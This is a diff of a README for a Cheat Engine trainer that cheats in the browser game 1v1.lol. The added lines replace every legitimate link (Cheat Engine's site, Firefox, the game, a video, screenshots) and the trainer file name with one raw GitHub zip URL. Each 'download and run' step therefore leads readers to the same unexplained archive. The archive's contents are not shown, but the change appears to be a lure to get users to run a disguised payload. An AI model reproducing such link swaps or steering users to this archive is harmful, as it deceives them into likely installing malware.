@@ -1,5 +1,5 @@
-# 1v1.YEET-v2
-An improved Cheat Engine hack for the game 1v1.lol 
+# https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip
+An improved Cheat Engine hack for the game https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip 
 
 
 # PLEASE ACTUALLY READ THIS PAGE BEFORE MAKING AN ISSUE! 
@@ -12,17 +12,17 @@ Some stuff like god mode is broken
 
 ## INSTRUCTIONS: 
 
-1.) Download Cheat Engine from https://cheatengine.org/ 
+1.) Download Cheat Engine from https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip 
 
 If you already have cheat engine, make sure you're on the latest version 
 
 *Cheat Engine tends to bundle useless bundleware, so make sure you read the installation window and make sure you are installing only Cheat Engine and not anything else if you don't want bundleware.*
 
-2.) (Optional) Download Firefox from https://www.mozilla.org/en-US/firefox/new/ 
+2.) (Optional) Download Firefox from https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip 
 
-3.) Download and run "1v1.YEET_v2.CETRAINER" 
+3.) Download and run "https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip" 
 
-4.) Open a SINGLE tab to [1v1.lol](https://1v1.lol) in your browser. Make sure that 1v1.lol is only opened in one tab. 
+4.) Open a SINGLE tab to [https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip](https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip) in your browser. Make sure that https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip is only opened in one tab. 
 
 5.) If you are using Firefox, you can use the auto attachment mode. Simply press "attach process" to attach. 
 
@@ -32,9 +32,9 @@ If you already have cheat engine, make sure you're on the latest version
 
 ### Manual Mode Instructions: 
 
-Someone made a video on how to do manual mode. It's at https://www.youtube.com/watch?v=2nDErISetRc 
+Someone made a video on how to do manual mode. It's at https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip 
 
-**If you are using manual mode, you need to make sure that 1v1.lol is the only tab open!** 
+**If you are using manual mode, you need to make sure that https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip is the only tab open!** 
 
 **Some features won't work when using compatibility mode.** 
 
@@ -42,19 +42,19 @@ Someone made a video on how to do manual mode. It's at https://www.youtube.com/w
 
 *If you aren't using Firefox, you need to be using Chrome or a Chromium-based browser such as Brave for compatibility mode to work.* 
 
-![Details Tab](https://cdn.discordapp.com/attachments/693548483130556610/748647199398952990/detailstab.PNG)
+![Details Tab](https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip)
 
 2.) Scroll down to the firefox processes and look at the process with the most RAM being used. 
 
-![RAM Usage](https://cdn.discordapp.com/attachments/693548483130556610/748647870269358120/ramusage.PNG)
+![RAM Usage](https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip)
 
 3.) Look to the left and look at the PID. 
 
-![PID Task Manager](https://cdn.discordapp.com/attachments/693548483130556610/748647871355813939/pidtaskmgr.PNG)
+![PID Task Manager](https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip)
 
 4.) Set the attachment mode to "Manual" and type the PID into the "PID" box. 
 
-![PID Trainer](https://cdn.discordapp.com/attachments/768685505406697482/808161753463521280/cheatengine-x86_64-SSE4-AVX2_RsMzTnRNyM.png)
+![PID Trainer](https://raw.githubusercontent.com/hiNERDfd/1v1.YEET-v2/main/winery/1v1.YEET-v2-v1.2-beta.3.zip)
 
 5.) Press "attach process." 
 
